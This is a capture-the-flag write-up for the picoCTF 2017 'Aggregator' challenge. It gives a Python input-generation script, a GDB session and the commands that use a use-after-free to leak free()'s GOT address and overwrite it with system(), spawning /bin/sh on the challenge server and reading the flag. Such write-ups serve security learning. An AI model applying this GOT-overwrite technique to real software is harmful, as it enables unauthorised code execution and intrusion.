# Aggregator

```
I wrote a program to help me synthesize my log files. You can edit the log files to add annotations that will print out aggregated information. Because the original program that outputs the logs was a bit faulty, I also included the ability to clear a single day of logs.
Find my aggregator running on shell2017.picoctf.com:13902. aggregator.c aggregator
HINTS
Does it look like there is a stack vulnerability?
```

We noticed that there was a use-after-free error, so we played around with inputs in GDB until we got a writable data pointer that also pointed to the location of an active table entry. Then we wrote over the pointer to the table entry's data with the pointer to the GOT address of free() in order to leak the location of free to the console. We used the following python script

```python
python
output = "3-1-1 999\n"
output += "2-1-1 420\n"
for i in range(0, 40):
  output += "4-1-1 " + str(i) + "\n"
output += "~2-1-1\n"
output += "~3-1-1\n"
output += "~4-1-1\n"
output += "5-1-1\n"
output += "1-1-1 6299376\n"
output += "1-1-1 72340172838076673\n"
output += "1-1-1 18446744073709551615\n"
output += "1-1-1 1\n"
output += "1-1-1 0\n"
output += "am 4-1\n"
print output
```

Next we had to find the offset between the actual address of free() and system() at runtime in GDB. The values at the given GOT addresses at runtime. We did this by attaching GDB to the running process after leaking the glibc address of free. It was important to do this on a system running the same version of libc as the shell server, so we just carried out this step on the shell server.

```
$ (python aggregator.py; cat) | ./aggregator
140283963758080
^Z[2] + Stopped                    (python aggregator.py; cat) | ./aggregator
$ gdb -q -p `pidof aggregator`
Excess command line arguments ignored. (21905)
22110: No such file or directory.
Attaching to process 23535

Program received signal SIGTSTP, Stopped (user).
Reading symbols from /home/rjm27trekkie/aggregator...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.19.so...done.
done.
Loaded symbols for /lib/x86_64-linux-gnu/libc.so.6
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.19.so...done.
done.
Loaded symbols for /lib64/ld-linux-x86-64.so.2
0x00007f9667d9cba0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
81      ../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) p system
$1 = {<text variable, no debug info>} 0x7f9667d02490 <__libc_system>
(gdb) q
A debugging session is active.

        Inferior 1 [process 23535] will be detached.

Quit anyway? (y or n) y
Detaching from program: /home/rjm27trekkie/aggregator, process 23535
$ python -c "print '{0:02x}'.format(0x7f9667d02490 - 140283963758080)"
-3b170
$
```

The inputs after this point will change every time. They will need to take the following format.

```
aM 4-1 THIS PRINTS THE ADDRESS OF FREE
4-1-1 ADDRESS OF SYSTEM (offset: -0x3b170)
4-1-1 ADDRESS OF SYSTEM
a+ 1-1 ; /bin/sh
```

We pipe the output of the script into the program. Then we add the offset to the address for free, writing system() to the GOT entry. Finally, a line containing "; /bin/sh" is added so that program would call system("/bin/sh") when it attempts to call free(). This gives a shell. Then we just we cat the flag. 

```
$ (python aggregator.py; cat) | nc shell2017.picoctf.com 13902
140627465098752
4-1-1 140627464856720
4-1-1 140627464856720
a+ 1-1 ; /bin/sh
sh: 1: a+: not found
ls
aggregator
flag.txt
xinetd_wrapper.sh
cat flag.txt
5eaacf941a181a45e0b17327842a72f5
```
